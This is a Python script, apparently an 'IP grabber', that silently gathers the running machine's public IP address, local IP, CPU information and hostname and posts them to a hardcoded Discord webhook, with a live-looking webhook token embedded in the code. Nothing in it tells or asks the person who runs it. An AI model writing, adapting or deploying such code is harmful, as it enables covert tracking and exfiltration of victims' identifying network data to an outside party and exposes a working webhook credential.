import logging
import requests
import socket
import platform
import datetime

logging.basicConfig(level=logging.INFO, filename='app.log', format='%(asctime)s - %(levelname)s - %(message)s')

webhook_urls = [
    'https://discord.com/api/webhooks/1132473891525247087/JmFoogw7Lpnc7CoNSU6wem_NgPOxG8Gnxhb2LCX9iW1C031E7g3Sjdsjqd56hEXXtUu6',
]

def get_public_ip():
    try:
        return requests.get('https://api.ipify.org').text
    except requests.exceptions.RequestException:
        return None

def get_real_address():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except socket.error:
        return None

def get_system_info():
    info = {
        'Public IP Address': get_public_ip(),
        'Real Address': get_real_address(),
        'CPU Info': platform.processor(),
        'System Hostname': socket.gethostname(),
    }
    return info

def send_info_to_webhooks(pc_info):
    payload = {
        'content': "Logs generated by GabeDaBozo."
    }

    for webhook_url in webhook_urls:
        try:
            requests.post(webhook_url, json=payload)
        except requests.exceptions.RequestException:
            pass

    payload['content'] = f"System Information:\n{pc_info}"
    try:
        for webhook_url in webhook_urls:
            response = requests.post(webhook_url, json=payload)
            if response.ok:
                print(f"System info sent successfully to {webhook_url}.")
            else:
                print(f"Failed to send system info to {webhook_url}.")
    except requests.exceptions.RequestException as e:
        print("An error occurred while sending the message:", e)

if __name__ == "__main__":
    system_info = get_system_info()

    pc_info = "\n".join([f"{key}: {value}" for key, value in system_info.items()])
    send_info_to_webhooks(pc_info)
